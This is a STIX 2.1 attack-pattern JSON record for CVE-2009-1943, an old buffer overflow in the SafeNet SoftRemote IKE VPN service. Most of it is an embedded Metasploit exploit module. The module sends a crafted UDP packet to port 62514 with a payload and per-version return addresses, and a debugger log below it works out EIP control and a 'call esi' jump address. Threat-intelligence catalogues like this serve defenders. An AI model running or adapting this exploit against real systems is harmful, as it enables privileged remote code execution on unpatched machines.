{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bd717044-193d-4a75-bad2-caa069f0b5fd",
    "created": "2024-08-14T16:55:48.367188Z",
    "modified": "2024-08-14T16:55:48.367192Z",
    "name": "SafeNet SoftRemote IKE Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Safenet SoftRemote IKE IreIKE.exe service. When sending a specially crafted udp packet to port 62514 an attacker may be able to execute arbitrary code. This module has been tested with Juniper NetScreen-Remote 10.8.0 (Build 20) using windows/meterpreter/reverse_ord_tcp payloads. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/vpn/safenet_ike_11.rb",
            "external_id": "safenet_ike_11.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1943"
        },
        {
            "source_name": "reference",
            "url": "http://reversemode.com/index.php?option=com_content&task=view&id=63&Itemid=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SafeNet SoftRemote IKE Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Safenet SoftRemote IKE IreIKE.exe\n        service. When sending a specially crafted udp packet to port 62514 an\n        attacker may be able to execute arbitrary code. This module has\n        been tested with Juniper NetScreen-Remote 10.8.0 (Build 20) using\n        windows/meterpreter/reverse_ord_tcp payloads.\n      },\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1943' ],\n          [ 'OSVDB', '54831' ],\n          [ 'BID', '35154' ],\n          [ 'URL', 'http://reversemode.com/index.php?option=com_content&task=view&id=63&Itemid=1' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 213,\n          'BadChars' => \"\\x00\\x0a\\x20\\x0d\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'SafeNet Irelke 10.8.0.20',   { 'Ret' => 0x004514a9 } ],\n          [ 'SafeNet Irelke 10.8.0.10',   { 'Ret' => 0x00451889 } ],\n          [ 'SafeNet Irelke 10.8.3.6',    { 'Ret' => 0x00451929 } ],\n        ],\n      'DisclosureDate' => '2009-06-01',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(62514)], self)\n  end\n\n  def exploit\n\n    connect_udp\n\n    sploit =  [0x01000000].pack('V') # IPC packet\n    sploit << [0x00000033].pack('V') # Exploit this thing using command 0x11 (0x33 - 0x28).\n    sploit << payload.encoded\n    sploit << [target.ret].pack('V')\n    sploit << rand_text_alpha_upper(150)\n\n    print_status(\"Trying target #{target.name}...\")\n    udp_sock.put(sploit)\n\n    select(nil,nil,nil,5)\n    handler\n    disconnect_udp\n\n  end\n\nend\n=begin\n0:013> g\n(f7c.fe0): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=68413268 ebx=00dcfde8 ecx=00000000 edx=014af53c esi=00dcfdf1 edi=00000000\neip=41316841 esp=014af64c ebp=00000001 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n41316841 ??              ???\n0:008> !pattern_offset 300\n[Byakugan] Control of eax at offset 217.\n[Byakugan] Control of eip at offset 213.\n0:008> d esp\n014af64c  68 32 41 68 33 41 68 34-41 68 35 41 68 36 41 68  h2Ah3Ah4Ah5Ah6Ah\n014af65c  37 41 68 38 41 68 39 41-69 30 41 69 31 41 69 32  7Ah8Ah9Ai0Ai1Ai2\n014af66c  41 69 33 41 69 34 41 69-35 41 69 36 41 69 37 41  Ai3Ai4Ai5Ai6Ai7A\n014af67c  69 38 41 69 39 41 6a 30-41 6a 31 41 6a 32 41 6a  i8Ai9Aj0Aj1Aj2Aj\n014af68c  33 41 6a 34 41 6a 35 41-6a 36 41 6a 37 41 6a 38  3Aj4Aj5Aj6Aj7Aj8\n014af69c  41 6a 39 41 6b 30 41 6b-31 41 6b 32 41 6b 33 41  Aj9Ak0Ak1Ak2Ak3A\n014af6ac  6b 34 41 6b 35 41 6b 36-41 6b 37 41 6b 38 41 6b  k4Ak5Ak6Ak7Ak8Ak\n014af6bc  39 41 6c 30 41 6c 31 41-6c 32 41 6c 33 41 6c 34  9Al0Al1Al2Al3Al4\n0:008> d esi\n00dcfdf1  61 30 41 61 31 41 61 32-41 61 33 41 61 34 41 61  a0Aa1Aa2Aa3Aa4Aa\n00dcfe01  35 41 61 36 41 61 37 41-61 38 41 61 39 41 62 30  5Aa6Aa7Aa8Aa9Ab0\n00dcfe11  41 62 31 41 62 32 41 62-33 41 62 34 41 62 35 41  Ab1Ab2Ab3Ab4Ab5A\n00dcfe21  62 36 41 62 37 41 62 38-41 62 39 41 63 30 41 63  b6Ab7Ab8Ab9Ac0Ac\n00dcfe31  31 41 63 32 41 63 33 41-63 34 41 63 35 41 63 36  1Ac2Ac3Ac4Ac5Ac6\n00dcfe41  41 63 37 41 63 38 41 63-39 41 64 30 41 64 31 41  Ac7Ac8Ac9Ad0Ad1A\n00dcfe51  64 32 41 64 33 41 64 34-41 64 35 41 64 36 41 64  d2Ad3Ad4Ad5Ad6Ad\n00dcfe61  37 41 64 38 41 64 39 41-65 30 41 65 31 41 65 32  7Ad8Ad9Ae0Ae1Ae2\n0:008> s -b 0x00400000 0x0047c000 ff d6\n.\n.\n004514a9  ff d6 8b e8 8d 44 24 10-c7 44 24 10 00 00 00 00  .....D$..D$.....\n0:008> u 0x004514a9 L1\nIreIKE+0x514a9:\n004514a9 ffd6            call    esi\n=end\n",
    "x_mitre_disclosure_date": "2009-06-01",
    "x_mitre_platforms": [
        "win'"
    ]
}